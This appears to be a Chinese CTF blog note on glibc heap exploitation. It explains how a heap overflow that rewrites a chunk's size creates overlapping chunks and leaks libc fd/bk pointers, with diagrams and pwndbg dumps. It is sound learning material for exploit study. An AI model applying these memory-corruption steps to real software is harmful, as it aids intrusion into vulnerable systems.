
脑子是不够用了 记下来好了
在CTFwiki 和 丁神的博客看到了两种leak的方法 都很巧妙了

丁神的方法
https://blog.csdn.net/qq_29343201/article/details/66476135
利用堆溢出修改chunk_size，造成chunk overlap，dump的时候就可以把后面一个chunk的fd和bk显示出来了


分配chunk 0（size = 0x60）分配chunk1（0x40）
+---------------+---------------+------------------+
|               |               |                  |
|     chunk 0   |    chunk 1    |      chunk 1     |
|      0x60     |   head(0x10)  |     content 0x40 |
|               |               |                  |
+---------------+---------------+------------------+
pwndbg> x/50gx 0x5566684e9000
0x5566684e9000:	0x0000000000000000	0x0000000000000071
0x5566684e9010:	0x0000000000000000	0x0000000000000000
0x5566684e9020:	0x0000000000000000	0x0000000000000000
0x5566684e9030:	0x0000000000000000	0x0000000000000000
0x5566684e9040:	0x0000000000000000	0x0000000000000000
0x5566684e9050:	0x0000000000000000	0x0000000000000000
0x5566684e9060:	0x0000000000000000	0x0000000000000000
0x5566684e9070:	0x0000000000000000	0x0000000000000051
0x5566684e9080:	0x0000000000000000	0x0000000000000000

从chunk 0改写chunk1的头，改成0x71
再分配一个chunk2 （0x100)

                                    fake chunk 1 （0x70)
                +-----------------------------------------------------------+-
                |                                                           |
                |                                                           |
                |                                                           |
+-------------------------------+------------------+-------------+------------------------+
|               |               |                  |             |          |
|     chunk 0   |    chunk 1    |      chunk 1     |   chunk 2   | content  |   content
|      0x60     |   head(0x10)  |     content 0x40 |  head(0x10) |  (0x10)  |
|               |               |                  |             |          |
+---------------+---------------+------------------+-------------+----------+-------------+
0x56503d5e2000:	0x0000000000000000	0x0000000000000071
0x56503d5e2010:	0x6161616161616161	0x6161616161616161
0x56503d5e2020:	0x6161616161616161	0x6161616161616161
0x56503d5e2030:	0x6161616161616161	0x6161616161616161
0x56503d5e2040:	0x6161616161616161	0x6161616161616161
0x56503d5e2050:	0x6161616161616161	0x6161616161616161
0x56503d5e2060:	0x6161616161616161	0x6161616161616161
0x56503d5e2070:	0x0000000000000000	0x0000000000000071
0x56503d5e2080:	0x0000000000000000	0x0000000000000000
0x56503d5e2090:	0x0000000000000000	0x0000000000000000
0x56503d5e20a0:	0x0000000000000000	0x0000000000000000
0x56503d5e20b0:	0x0000000000000000	0x0000000000000000
0x56503d5e20c0:	0x0000000000000000	0x0000000000000111
0x56503d5e20d0:	0x0000000000000000	0x0000000000000000

这个时候free chunk 1就可以把fake chunk 变成真 chunk了 ，同时我们还能编辑chunk 2 的内容 
或许这就叫做overlap吧
但是在free chunk 1之前 还需要过free对 next size的检查
在chunk 2 的content里伪造一个头部就好了
                                    fake chunk 1 （0x70)
                +-----------------------------------------------------------+-
                |                                                           |
                |                                                           |
                |                                                           |
+-------------------------------+------------------+-------------+------------------------+
|               |               |                  |             |          |
|     chunk 0   |    chunk 1    |      chunk 1     |   chunk 2   | content  |   fake head
|      0x60     |   head(0x10)  |     content 0x40 |  head(0x10) |  (0x10)  |   (0x10)
|               |               |                  |             |          |
+---------------+---------------+------------------+-------------+----------+-------------+

0x563a6f582000:	0x0000000000000000	0x0000000000000071
0x563a6f582010:	0x6161616161616161	0x6161616161616161
0x563a6f582020:	0x6161616161616161	0x6161616161616161
0x563a6f582030:	0x6161616161616161	0x6161616161616161
0x563a6f582040:	0x6161616161616161	0x6161616161616161
0x563a6f582050:	0x6161616161616161	0x6161616161616161
0x563a6f582060:	0x6161616161616161	0x6161616161616161
0x563a6f582070:	0x0000000000000000	0x0000000000000071
0x563a6f582080:	0x0000000000000000	0x0000000000000000
0x563a6f582090:	0x0000000000000000	0x0000000000000000
0x563a6f5820a0:	0x0000000000000000	0x0000000000000000
0x563a6f5820b0:	0x0000000000000000	0x0000000000000000
0x563a6f5820c0:	0x0000000000000000	0x0000000000000111
0x563a6f5820d0:	0x6161616161616161	0x6161616161616161
0x563a6f5820e0:	0x0000000000000000	0x0000000000000071
0x563a6f5820f0:	0x0000000000000000	0x0000000000000000

free chunk 1之后在 allocate 一个 0x60大小的chunk1 
这个时候free chunk2 的话 在chunk 1 的content 里面就会有 chunk2 的fd、bk了 
dump chunk 1 就完成了 leak
但是在这道题中 allocate chunk的话会将 content清空 
所以我们需要修复一下 chunk 2 head 让他恢复到上面👆的样子
并且还需要再分配一个chunk 防止free chunk 2的时候与top chunk合并
之后再 free chunk2 再 dump chunk 1 
这个时候堆的情况：
                                         chunk 1 （0x70)
                +-----------------------------------------------------------+-
                |                                                           |
                |                                                           |
                |                                                           |
+-------------------------------+------------------+-------------+------------------------+
|               |               |                  |             |          |
|     chunk 0   |    chunk 1    |      chunk 1     |   chunk 2   |   libc   |   fake head
|      0x60     |   head(0x10)  |     content 0x40 |  head(0x10) |  fd、bk   |
|               |               |                  |             |          |
+---------------+---------------+------------------+-------+-----+----------+-------------+
                                                           ^
                                                           |
                                                       recovered
0x56008e378000:	0x0000000000000000	0x0000000000000071
0x56008e378010:	0x6161616161616161	0x6161616161616161
0x56008e378020:	0x6161616161616161	0x6161616161616161
0x56008e378030:	0x6161616161616161	0x6161616161616161
0x56008e378040:	0x6161616161616161	0x6161616161616161
0x56008e378050:	0x6161616161616161	0x6161616161616161
0x56008e378060:	0x6161616161616161	0x6161616161616161
0x56008e378070:	0x0000000000000000	0x0000000000000071
0x56008e378080:	0x6161616161616161	0x6161616161616161
0x56008e378090:	0x6161616161616161	0x6161616161616161
0x56008e3780a0:	0x6161616161616161	0x6161616161616161
0x56008e3780b0:	0x6161616161616161	0x6161616161616161
0x56008e3780c0:	0x0000000000000000	0x0000000000000111
0x56008e3780d0:	0x00007f9ac37e5b78	0x00007f9ac37e5b78  <----libc fd、bk
0x56008e3780e0:	0x0000000000000000	0x0000000000000071
0x56008e3780f0:	0x0000000000000000	0x0000000000000000

再来看一下CTF WIKI上给的leak的方法









